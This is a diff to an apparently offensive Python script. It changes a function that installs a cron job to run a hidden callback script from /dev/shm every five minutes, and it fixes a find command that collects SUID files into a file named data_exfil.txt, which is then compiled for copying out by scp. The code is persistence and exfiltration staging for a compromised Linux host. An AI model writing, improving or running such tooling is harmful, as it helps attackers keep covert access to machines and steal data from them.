@@ -637,9 +637,11 @@ def callback(local_ip, local_port):
 
 # create cronjob for executing callback script every 5 min
 def cron_make():
-   print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
-   os.system("echo '5 * * * * root /dev/shm/.data/data_log' >> /etc/crontab")
-   os.system("echo ' ' >> /etc/crontab")
+   print("\n### creating cronjob to execute callback every 5 min... ###")
+   os.system("crontab -l > /tmp/mycron")
+   os.system("echo '5 * * * * /dev/shm/.data/data_log' >> /tmp/mycron")
+   os.system("crontab /tmp/mycron")
+   os.system("rm -f /tmp/mycron")
    print("\n### cronjob created ###")
 
 
@@ -704,7 +706,7 @@ def extract(username,password,local_ip,local_port):
    os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo '' >> /tmp/data_exfil.txt")
    os.system("echo 'suid files:' >> /tmp/data_exfil.txt")
-   os.system("find / type -f perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")
+   os.system("find / -type f -perm /4000 2>/dev/null | tee -a /tmp/data_exfil.txt")
 
    # compile previous files into one for scp
    os.system("cat /tmp/sudo_l.txt >> /tmp/priv.txt")
